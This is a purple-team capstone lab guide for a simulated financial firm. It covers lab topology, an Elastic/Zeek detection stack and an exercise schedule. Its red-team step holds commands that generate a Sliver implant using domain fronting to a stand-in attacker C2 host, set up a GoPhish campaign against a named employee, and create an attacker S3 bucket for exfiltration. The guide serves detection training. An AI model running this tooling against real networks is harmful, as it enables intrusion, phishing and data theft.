# Day 21 — LAB.md
## Week 3 Capstone Lab Setup Guide
**NovaCrest Capital Group | Full Stack Purple Team**

---

## Lab Topology

```
INTERNET / RED TEAM VPS (198.51.100.0/24)
  └── Sliver teamserver (primary C2)
  └── Cobalt Strike teamserver (lateral movement phase)
  └── GoPhish (phishing delivery)
  └── S3 exfil bucket (attacker-controlled)
  └── Azure CDN fronting domain

CORPORATE NETWORK (10.0.0.0/8 — isolated lab VLAN)
  ├── WS-FIN-04 (10.0.1.40) — Windows 11 22H2 — primary target
  │   ├── CrowdStrike Falcon agent
  │   ├── Sysmon v15 (SwiftOnSecurity config)
  │   └── Zscaler client (proxy egress)
  │
  ├── lnx-trade-01 (10.0.2.50) — Ubuntu 22.04 — trading server
  │   ├── auditd (privesc-hunt.rules from Day 17)
  │   └── Zeek sensor (SPAN port)
  │
  ├── SRV-AD-01 (10.0.3.10) — Windows Server 2022 — Domain Controller
  │   └── CrowdStrike Falcon agent
  │
  └── SRV-FS-01 (10.0.3.20) — Windows Server 2022 — File Server
      └── CrowdStrike Falcon agent

SECURITY MONITORING STACK
  ├── Elastic SIEM (10.0.100.10) — central SIEM
  ├── Zeek sensor (10.0.100.20) — inline network tap
  └── Purple Team Dashboard (localhost:5000)
```

---

## Step 1: Pre-Exercise Infrastructure Check

```bash
# Verify all lab VMs are online
for host in WS-FIN-04 lnx-trade-01 SRV-AD-01 SRV-FS-01; do
    ping -c 1 $host > /dev/null && echo "✅ $host online" || echo "❌ $host OFFLINE"
done

# Verify Elastic SIEM receiving logs
curl -s "http://localhost:9200/_cat/indices?h=index,docs.count" | \
    grep -E "filebeat|winlogbeat|auditbeat"

# Verify CrowdStrike agents checked in (last 30 min)
# CrowdStrike console: Host Management → filter by last seen > 30 min ago

# Verify Zeek active
sudo zeekctl status | grep -E "(running|crashed)"

# Verify Zscaler proxy routing
curl -x proxy.zscaler.com:80 -s https://api.ipify.org
# Should return Zscaler egress IP, not lab IP

# Start purple team tracking dashboard
python3 scripts/engagement_tracker.py --exercise-mode &
echo "Dashboard: http://localhost:5000"
```

---

## Step 2: Red Team Tool Check

```bash
# Sliver teamserver (on attacker VPS — run before exercise)
sudo sliver-server daemon &

# Generate implants for all phases
sliver > generate --http cdn.novacrest-updates.com:443 \
                  --os windows --arch amd64 \
                  --name fin04_implant \
                  --seconds 300 --jitter 35 \
                  --http-header "Host: sliver.attacker-c2.com"

# GoPhish for phishing delivery
# https://github.com/gophish/gophish
./gophish &
# Dashboard: https://localhost:3333
# Configure campaign: target=j.henderson@novacrest.com

# Cobalt Strike (lateral movement phase — requires CS license)
# teamserver 198.51.100.99 [password] [profile.c2]
# Profile: malleable C2 with Azure CDN domain fronting

# S3 exfil bucket (pre-created in attacker AWS account)
aws s3 mb s3://novacrest-exfil --profile attacker-profile
aws s3api put-bucket-acl --bucket novacrest-exfil \
    --acl private --profile attacker-profile
```

---

## Step 3: Blue Team Detection Stack Configuration

### Elastic SIEM Setup
```bash
# Install Elastic Stack (if not pre-deployed from Day 19)
docker-compose -f elastic-stack.yml up -d

# Configure ingest pipelines for all sources
# Winlogbeat (Windows endpoints)
cat > /etc/winlogbeat/winlogbeat.yml << 'EOF'
winlogbeat.event_logs:
  - name: Security
    event_id: 4624, 4625, 4648, 4672, 4688, 4769, 1102, 4698, 7036
  - name: Microsoft-Windows-Sysmon/Operational
  - name: System
output.elasticsearch:
  hosts: ["http://elastic-siem:9200"]
  index: "winlogbeat-%{[agent.version]}-%{+yyyy.MM.dd}"
EOF

# Filebeat (Zeek logs)
cat > /etc/filebeat/filebeat.yml << 'EOF'
filebeat.inputs:
  - type: filestream
    paths:
      - /opt/zeek/logs/current/*.log
    parsers:
      - ndjson:
          keys_under_root: true
          target: zeek
output.elasticsearch:
  hosts: ["http://elastic-siem:9200"]
  index: "zeek-%{+yyyy.MM.dd}"
EOF

# Load detection rules into Elastic Security
# Kibana → Security → Detection Rules → Import
# Upload: elastic_killchain.eql (see queries/ folder)
```

### Kill Chain Detection Rules (Elastic)
```
Load all EQL rules from queries/elastic_killchain.eql:
  1. Rule: "APT Kill Chain — Initial Access (Macro Execution)"
  2. Rule: "APT Kill Chain — Persistence (Run Key + Scheduled Task)"
  3. Rule: "APT Kill Chain — Privilege Escalation (LSASS + 4672)"
  4. Rule: "APT Kill Chain — Defense Evasion (Log Clear + Defender Off)"
  5. Rule: "APT Kill Chain — Lateral Movement (PtT + WMI)"
  6. Rule: "APT Kill Chain — C2 (JA3 + Domain Fronting)"
  7. Rule: "APT Kill Chain — Exfil (Archive + Volumetric)"
  8. Rule: "APT Kill Chain — Full Sequence Correlation"
```

### Purple Team Dashboard
```bash
# Start MTTD tracking dashboard (see scripts/engagement_tracker.py)
python3 scripts/engagement_tracker.py \
    --exercise-start "2026-06-21T09:00:00Z" \
    --phases 8 \
    --sla 20 \
    --elastic-host http://localhost:9200 \
    --port 5000

# Dashboard provides:
#   - Real-time phase timer per phase
#   - Detection event feed (from Elastic alerts)
#   - MTTD tracker per phase
#   - Running score (pts detected within SLA)
#   - Kill chain coverage heat map
```

---

## Step 4: Exercise Execution (T+0 to T+5:30)

```
PHASE TRANSITION PROTOCOL (repeat for each phase):
  □ Red team: log phase start timestamp in engagement_tracker
  □ Red team: execute phase TTPs; log each action with timestamp
  □ Blue team: monitor dashboards; log first detection timestamp
  □ Purple lead: record MTTD = (detection_time - phase_start_time)
  □ Purple lead: update score in engagement_tracker
  □ Both teams: continue to next phase (do NOT stop for detections)
  □ Phase runs full 45 minutes regardless of detection status

DETECTION LOGGING (blue team):
  → When alert fires: immediately log in Slack #purple-exercise channel:
    Format: [TIMESTAMP UTC] [PHASE] [DETECTION LAYER] [ALERT NAME]
  → Purple lead records in engagement_tracker dashboard
```

---

## Step 5: Post-Exercise Debrief (T+5:30–6:00)

```
JOINT KILL CHAIN REVIEW (30 minutes):
  1. Purple lead presents MTTD scoreboard (10 min)
  2. Red team: walk through each phase — what was done, timestamps (10 min)
  3. Blue team: walk through detections — what fired, what missed (10 min)

KEY QUESTIONS TO ANSWER:
  □ Which phases had zero detections? Why?
  □ Which detection layer had highest MTTD / lowest?
  □ Where did multiple layers fire (redundancy — good)?
  □ Where did ZERO layers fire (critical gap)?
  □ What single control would close the most gaps?
  □ How does Week 3 (Days 15–21) MTTD compare to Day 14 baseline?

ATT&CK NAVIGATOR SESSION:
  → Run: python3 scripts/attck_navigator_exporter.py --results engagement_results.json
  → Opens ATT&CK Navigator with color-coded heat map:
     Red = technique used; Green = detected; Yellow = detected late; Gray = missed
```

---

*Day 21 Lab Guide | Week 3 Capstone*
*NovaCrest Capital Group | V. Willis, CISSP*
*github.com/Blaakpearl/Blaakpearl*
